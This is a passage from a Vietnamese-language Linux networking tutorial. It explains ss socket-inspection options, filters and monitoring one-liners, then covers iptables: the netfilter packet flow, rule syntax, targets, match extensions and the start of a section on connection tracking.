</span></span><span class=line><span class=cl>-u          <span class=c1># UDP sockets</span>
</span></span><span class=line><span class=cl>-l          <span class=c1># Listening sockets</span>
</span></span><span class=line><span class=cl>-a          <span class=c1># All sockets (listening + non-listening)</span>
</span></span><span class=line><span class=cl>-n          <span class=c1># Numeric (không resolve hostname/port)</span>
</span></span><span class=line><span class=cl>-p          <span class=c1># Show process using socket</span>
</span></span><span class=line><span class=cl>-e          <span class=c1># Extended info</span>
</span></span><span class=line><span class=cl>-m          <span class=c1># Memory usage</span>
</span></span><span class=line><span class=cl>-i          <span class=c1># TCP internal info (congestion, RTT...)</span>
</span></span><span class=line><span class=cl>-s          <span class=c1># Summary statistics</span>
</span></span><span class=line><span class=cl>-4/-6       <span class=c1># IPv4/IPv6 only</span>
</span></span><span class=line><span class=cl>-o          <span class=c1># Timer information</span></span></span></code></pre></div><h3 class=heading-element id=24-các-lệnh-hay-dùng><span>2.4 Các Lệnh Hay Dùng</span>
<a href=#24-c%c3%a1c-l%e1%bb%87nh-hay-d%c3%b9ng class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Xem tất cả TCP connections</span>
</span></span><span class=line><span class=cl>ss -ta
</span></span><span class=line><span class=cl>ss -tan                       <span class=c1># Numeric (nhanh hơn)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chỉ listening sockets</span>
</span></span><span class=line><span class=cl>ss -tln                       <span class=c1># TCP listening</span>
</span></span><span class=line><span class=cl>ss -uln                       <span class=c1># UDP listening</span>
</span></span><span class=line><span class=cl>ss -tuln                      <span class=c1># TCP + UDP listening</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Kèm process info (cần root)</span>
</span></span><span class=line><span class=cl>ss -tlnp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output:</span>
</span></span><span class=line><span class=cl><span class=c1># State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process</span>
</span></span><span class=line><span class=cl><span class=c1># LISTEN 0      128    0.0.0.0:22          0.0.0.0:*         users:((&#34;sshd&#34;,pid=1234,fd=3))</span>
</span></span><span class=line><span class=cl><span class=c1># LISTEN 0      511    0.0.0.0:80          0.0.0.0:*         users:((&#34;nginx&#34;,pid=5678,fd=6))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Giải thích Recv-Q và Send-Q:</span>
</span></span><span class=line><span class=cl><span class=c1># Với LISTEN: Recv-Q = connections in queue, Send-Q = backlog size</span>
</span></span><span class=line><span class=cl><span class=c1># Với ESTABLISHED: Recv-Q = bytes chưa đọc, Send-Q = bytes chưa gửi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># TCP internal info</span>
</span></span><span class=line><span class=cl>ss -ti
</span></span><span class=line><span class=cl><span class=c1># Output có:</span>
</span></span><span class=line><span class=cl><span class=c1># cubic           ← Congestion control algorithm</span>
</span></span><span class=line><span class=cl><span class=c1># rto:204         ← Retransmission timeout (ms)</span>
</span></span><span class=line><span class=cl><span class=c1># rtt:1.5/0.75    ← Round-trip time (ms)</span>
</span></span><span class=line><span class=cl><span class=c1># cwnd:10         ← Congestion window</span>
</span></span><span class=line><span class=cl><span class=c1># send 77.9Mbps   ← Estimated send bandwidth</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Summary</span>
</span></span><span class=line><span class=cl>ss -s
</span></span><span class=line><span class=cl><span class=c1># Total: 1234</span>
</span></span><span class=line><span class=cl><span class=c1># TCP:   567 (estab 123, closed 234, orphaned 12, timewait 89)</span>
</span></span><span class=line><span class=cl><span class=c1># UDP:   45</span></span></span></code></pre></div><h3 class=heading-element id=25-filtering><span>2.5 Filtering</span>
<a href=#25-filtering class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Filter syntax:</span>
</span></span><span class=line><span class=cl>ss <span class=o>[</span>options<span class=o>]</span> <span class=o>[</span> state STATE <span class=o>]</span> <span class=o>[</span> expression <span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Filter by state</span>
</span></span><span class=line><span class=cl>ss -t state established
</span></span><span class=line><span class=cl>ss -t state time-wait
</span></span><span class=line><span class=cl>ss -t state listening
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Filter by address/port</span>
</span></span><span class=line><span class=cl>ss -tn dst 192.168.1.1           <span class=c1># Destination IP</span>
</span></span><span class=line><span class=cl>ss -tn src 192.168.1.100         <span class=c1># Source IP</span>
</span></span><span class=line><span class=cl>ss -tn <span class=nv>dport</span> <span class=o>=</span> :443              <span class=c1># Destination port</span>
</span></span><span class=line><span class=cl>ss -tn <span class=nv>sport</span> <span class=o>=</span> :22               <span class=c1># Source port</span>
</span></span><span class=line><span class=cl>ss -tn <span class=nv>dport</span> <span class=o>=</span> :80 or <span class=nv>dport</span> <span class=o>=</span> :443
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Filter by port range</span>
</span></span><span class=line><span class=cl>ss -tn dport <span class=se>\&gt;</span> :1024
</span></span><span class=line><span class=cl>ss -tn dport <span class=se>\&lt;</span> :1024
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Complex filters</span>
</span></span><span class=line><span class=cl>ss -tn <span class=s1>&#39;dst 10.0.0.0/8 and dport = :443&#39;</span>
</span></span><span class=line><span class=cl>ss -tn <span class=s1>&#39;( dport = :80 or dport = :443 ) and dst 192.168.1.0/24&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exclude localhost</span>
</span></span><span class=line><span class=cl>ss -tn <span class=s1>&#39;not src 127.0.0.0/8&#39;</span></span></span></code></pre></div><h3 class=heading-element id=26-monitoring-use-cases><span>2.6 Monitoring Use Cases</span>
<a href=#26-monitoring-use-cases class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Đếm connections theo state</span>
</span></span><span class=line><span class=cl>ss -tan <span class=p>|</span> awk <span class=s1>&#39;NR&gt;1 {print $1}&#39;</span> <span class=p>|</span> sort <span class=p>|</span> uniq -c <span class=p>|</span> sort -rn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Đếm connections theo IP</span>
</span></span><span class=line><span class=cl>ss -tn state established <span class=p>|</span> awk <span class=s1>&#39;{print $4}&#39;</span> <span class=p>|</span> cut -d: -f1 <span class=p>|</span> sort <span class=p>|</span> uniq -c <span class=p>|</span> sort -rn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tìm port nào đang listen</span>
</span></span><span class=line><span class=cl>ss -tlnp <span class=p>|</span> grep LISTEN
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tìm process chiếm port 80</span>
</span></span><span class=line><span class=cl>ss -tlnp <span class=s1>&#39;sport = :80&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem connection của process cụ thể</span>
</span></span><span class=line><span class=cl>ss -tnp <span class=p>|</span> grep nginx
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Real-time monitoring</span>
</span></span><span class=line><span class=cl>watch -n <span class=m>1</span> <span class=s1>&#39;ss -s&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Detect SYN flood (nhiều SYN_RECV)</span>
</span></span><span class=line><span class=cl>ss -tn state syn-recv <span class=p>|</span> wc -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Detect connection leak (nhiều CLOSE_WAIT)</span>
</span></span><span class=line><span class=cl>ss -tn state close-wait <span class=p>|</span> wc -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Detect TIME_WAIT accumulation</span>
</span></span><span class=line><span class=cl>ss -tn state time-wait <span class=p>|</span> wc -l</span></span></code></pre></div><hr><h2 class=heading-element id=phần-3-iptables---firewall><span>PHẦN 3: IPTABLES - FIREWALL</span>
<a href=#ph%e1%ba%a7n-3-iptables---firewall class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=31-netfilter-architecture><span>3.1 Netfilter Architecture</span>
<a href=#31-netfilter-architecture class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                NETFILTER PACKET FLOW                        │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    ┌─────────────────────────────────────┐
</span></span><span class=line><span class=cl>                    │          PREROUTING                 │
</span></span><span class=line><span class=cl>   Incoming ──────► │  (raw → mangle → nat DNAT)          │
</span></span><span class=line><span class=cl>   Packet           └──────────────┬──────────────────────┘
</span></span><span class=line><span class=cl>                                   │
</span></span><span class=line><span class=cl>                         ┌─────────▼─────────┐
</span></span><span class=line><span class=cl>                         │ Routing Decision  │
</span></span><span class=line><span class=cl>                         └────┬─────────┬────┘
</span></span><span class=line><span class=cl>                              │         │
</span></span><span class=line><span class=cl>            For this host     │         │     For another host
</span></span><span class=line><span class=cl>                              │         │
</span></span><span class=line><span class=cl>               ┌──────────────▼──┐   ┌──▼──────────────────┐
</span></span><span class=line><span class=cl>               │     INPUT       │   │      FORWARD        │
</span></span><span class=line><span class=cl>               │ (mangle→filter) │   │ (mangle → filter)   │
</span></span><span class=line><span class=cl>               └────────┬────────┘   └──────────┬──────────┘
</span></span><span class=line><span class=cl>                        │                       │
</span></span><span class=line><span class=cl>                        ▼                       │
</span></span><span class=line><span class=cl>               ┌────────────────┐               │
</span></span><span class=line><span class=cl>               │ Local Process  │               │
</span></span><span class=line><span class=cl>               └────────┬───────┘               │
</span></span><span class=line><span class=cl>                        │                       │
</span></span><span class=line><span class=cl>               ┌────────▼───────┐               │
</span></span><span class=line><span class=cl>               │    OUTPUT      │               │
</span></span><span class=line><span class=cl>               │(raw→mangle→nat)│               │
</span></span><span class=line><span class=cl>               │   →filter)     │               │
</span></span><span class=line><span class=cl>               └────────┬───────┘               │
</span></span><span class=line><span class=cl>                        │                       │
</span></span><span class=line><span class=cl>                        └───────────┬───────────┘
</span></span><span class=line><span class=cl>                                    │
</span></span><span class=line><span class=cl>                    ┌───────────────▼─────────────────────┐
</span></span><span class=line><span class=cl>                    │         POSTROUTING                 │
</span></span><span class=line><span class=cl>   Outgoing ◄────── │     (mangle → nat SNAT)             │
</span></span><span class=line><span class=cl>   Packet           └─────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>5 Chains (hooks):
</span></span><span class=line><span class=cl><span class=k>-</span> PREROUTING:  Ngay khi packet vào, trước routing decision
</span></span><span class=line><span class=cl><span class=k>-</span> INPUT:       Packet đến local process
</span></span><span class=line><span class=cl><span class=k>-</span> FORWARD:     Packet đi qua (routing)
</span></span><span class=line><span class=cl><span class=k>-</span> OUTPUT:      Packet từ local process
</span></span><span class=line><span class=cl><span class=k>-</span> POSTROUTING: Trước khi packet ra interface
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>4 Tables (mỗi table chứa rules):
</span></span><span class=line><span class=cl><span class=k>-</span> raw:     Connection tracking exemption (NOTRACK)
</span></span><span class=line><span class=cl><span class=k>-</span> mangle:  Packet alteration (TOS, TTL, MARK)
</span></span><span class=line><span class=cl><span class=k>-</span> nat:     Network Address Translation (SNAT, DNAT, MASQUERADE)
</span></span><span class=line><span class=cl>- filter:  Packet filtering (ACCEPT, DROP, REJECT) ← Hay dùng nhất</span></span></code></pre></div><h3 class=heading-element id=32-rule-processing-algorithm><span>3.2 Rule Processing Algorithm</span>
<a href=#32-rule-processing-algorithm class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             RULE MATCHING = LINEAR SEARCH O(n)              │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mỗi chain là một LINKED LIST of rules:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Chain INPUT (policy ACCEPT)
</span></span><span class=line><span class=cl>┌──────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│ Rule 1: -s 10.0.0.0/8 -j DROP                            │
</span></span><span class=line><span class=cl>├──────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Rule 2: -p tcp --dport 22 -j ACCEPT                      │
</span></span><span class=line><span class=cl>├──────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Rule 3: -p tcp --dport 80 -j ACCEPT                      │
</span></span><span class=line><span class=cl>├──────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Rule 4: -p tcp --dport 443 -j ACCEPT                     │
</span></span><span class=line><span class=cl>├──────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ ...                                                      │
</span></span><span class=line><span class=cl>├──────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ Rule n: -j DROP (catch-all)                              │
</span></span><span class=line><span class=cl>└──────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Packet vào → Check Rule 1 → Không match → Check Rule 2 → ...
</span></span><span class=line><span class=cl>           → Match Rule k → Thực hiện target (-j)
</span></span><span class=line><span class=cl>           → Không match rule nào → Áp dụng chain policy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Độ phức tạp: O(n) với n = số rules
</span></span><span class=line><span class=cl>→ 10000 rules = 10000 comparisons mỗi packet
</span></span><span class=line><span class=cl>→ Cần tối ưu: Đặt rules hay match nhất lên đầu
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Performance tip:
</span></span><span class=line><span class=cl><span class=k>-</span> Đặt rules cho traffic nhiều nhất lên trước
</span></span><span class=line><span class=cl><span class=k>-</span> Dùng ipset cho danh sách IP lớn (O(1) lookup với hash)
</span></span><span class=line><span class=cl>- Dùng -m state để skip stateless packets</span></span></code></pre></div><h3 class=heading-element id=33-cú-pháp-cơ-bản><span>3.3 Cú Pháp Cơ Bản</span>
<a href=#33-c%c3%ba-ph%c3%a1p-c%c6%a1-b%e1%ba%a3n class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>iptables <span class=o>[</span>-t table<span class=o>]</span> COMMAND chain rule-specification
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tables:</span>
</span></span><span class=line><span class=cl>-t filter       <span class=c1># Default, packet filtering</span>
</span></span><span class=line><span class=cl>-t nat          <span class=c1># NAT</span>
</span></span><span class=line><span class=cl>-t mangle       <span class=c1># Packet modification</span>
</span></span><span class=line><span class=cl>-t raw          <span class=c1># Connection tracking</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Commands:</span>
</span></span><span class=line><span class=cl>-A chain        <span class=c1># Append rule</span>
</span></span><span class=line><span class=cl>-I chain <span class=o>[</span>num<span class=o>]</span>  <span class=c1># Insert rule (đầu hoặc vị trí num)</span>
</span></span><span class=line><span class=cl>-D chain <span class=o>[</span>num<span class=o>]</span>  <span class=c1># Delete rule</span>
</span></span><span class=line><span class=cl>-R chain num    <span class=c1># Replace rule</span>
</span></span><span class=line><span class=cl>-L <span class=o>[</span>chain<span class=o>]</span>      <span class=c1># List rules</span>
</span></span><span class=line><span class=cl>-F <span class=o>[</span>chain<span class=o>]</span>      <span class=c1># Flush (xóa tất cả rules)</span>
</span></span><span class=line><span class=cl>-P chain target <span class=c1># Set default policy</span>
</span></span><span class=line><span class=cl>-N chain        <span class=c1># Create new chain</span>
</span></span><span class=line><span class=cl>-X chain        <span class=c1># Delete user chain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rule specification:</span>
</span></span><span class=line><span class=cl>-p protocol     <span class=c1># tcp, udp, icmp, all</span>
</span></span><span class=line><span class=cl>-s <span class=nb>source</span>       <span class=c1># Source IP/network</span>
</span></span><span class=line><span class=cl>-d destination  <span class=c1># Destination IP/network</span>
</span></span><span class=line><span class=cl>--sport port    <span class=c1># Source port</span>
</span></span><span class=line><span class=cl>--dport port    <span class=c1># Destination port</span>
</span></span><span class=line><span class=cl>-i interface    <span class=c1># Input interface</span>
</span></span><span class=line><span class=cl>-o interface    <span class=c1># Output interface</span>
</span></span><span class=line><span class=cl>-m match        <span class=c1># Extended match module</span>
</span></span><span class=line><span class=cl>-j target       <span class=c1># Jump to target (action)</span></span></span></code></pre></div><h3 class=heading-element id=34-targets-actions><span>3.4 Targets (Actions)</span>
<a href=#34-targets-actions class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Terminating targets (dừng xử lý chain):</span>
</span></span><span class=line><span class=cl>ACCEPT          <span class=c1># Cho packet qua</span>
</span></span><span class=line><span class=cl>DROP            <span class=c1># Bỏ packet (không phản hồi)</span>
</span></span><span class=line><span class=cl>REJECT          <span class=c1># Bỏ packet + gửi error response</span>
</span></span><span class=line><span class=cl>RETURN          <span class=c1># Quay về chain gọi</span>
</span></span><span class=line><span class=cl>QUEUE           <span class=c1># Gửi lên userspace</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Non-terminating targets (tiếp tục rules sau):</span>
</span></span><span class=line><span class=cl>LOG             <span class=c1># Ghi log</span>
</span></span><span class=line><span class=cl>MARK            <span class=c1># Đánh dấu packet</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># NAT targets:</span>
</span></span><span class=line><span class=cl>SNAT            <span class=c1># Source NAT</span>
</span></span><span class=line><span class=cl>DNAT            <span class=c1># Destination NAT</span>
</span></span><span class=line><span class=cl>MASQUERADE      <span class=c1># Dynamic SNAT (cho dynamic IP)</span>
</span></span><span class=line><span class=cl>REDIRECT        <span class=c1># Redirect port</span></span></span></code></pre></div><h3 class=heading-element id=35-match-extensions><span>3.5 Match Extensions</span>
<a href=#35-match-extensions class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># State tracking (conntrack)</span>
</span></span><span class=line><span class=cl>-m state --state NEW,ESTABLISHED,RELATED
</span></span><span class=line><span class=cl><span class=c1># NEW:         Connection mới</span>
</span></span><span class=line><span class=cl><span class=c1># ESTABLISHED: Đã thiết lập</span>
</span></span><span class=line><span class=cl><span class=c1># RELATED:     Liên quan (VD: FTP data connection)</span>
</span></span><span class=line><span class=cl><span class=c1># INVALID:     Không xác định</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># TCP flags</span>
</span></span><span class=line><span class=cl>-m tcp --tcp-flags SYN,RST,ACK SYN    <span class=c1># SYN packet</span>
</span></span><span class=line><span class=cl>-m tcp --syn                           <span class=c1># Shorthand cho trên</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Multiple ports</span>
</span></span><span class=line><span class=cl>-m multiport --dports 80,443,8080
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># IP range</span>
</span></span><span class=line><span class=cl>-m iprange --src-range 192.168.1.100-192.168.1.200
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rate limiting</span>
</span></span><span class=line><span class=cl>-m limit --limit 10/minute --limit-burst <span class=m>20</span>
</span></span><span class=line><span class=cl><span class=c1># Cho qua 20 packets ngay, sau đó tối đa 10/phút</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Recent (dynamic block)</span>
</span></span><span class=line><span class=cl>-m recent --name badguys --set
</span></span><span class=line><span class=cl>-m recent --name badguys --update --seconds <span class=m>60</span> --hitcount <span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># String matching</span>
</span></span><span class=line><span class=cl>-m string --string <span class=s2>&#34;malware&#34;</span> --algo bm    <span class=c1># Boyer-Moore algorithm</span>
</span></span><span class=line><span class=cl>-m string --string <span class=s2>&#34;malware&#34;</span> --algo kmp   <span class=c1># Knuth-Morris-Pratt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Comment</span>
</span></span><span class=line><span class=cl>-m comment --comment <span class=s2>&#34;Allow SSH&#34;</span></span></span></code></pre></div><h3 class=heading-element id=36-stateful-firewall><span>3.6 Stateful Firewall</span>
<a href=#36-stateful-firewall class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             CONNECTION TRACKING (conntrack)                 │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>conntrack table = Hash table theo 5-tuple:
</span></span><span class=line><span class=cl>(protocol, src_ip, src_port, dst_ip, dst_port)
</span></span><span class=line><span class=cl>
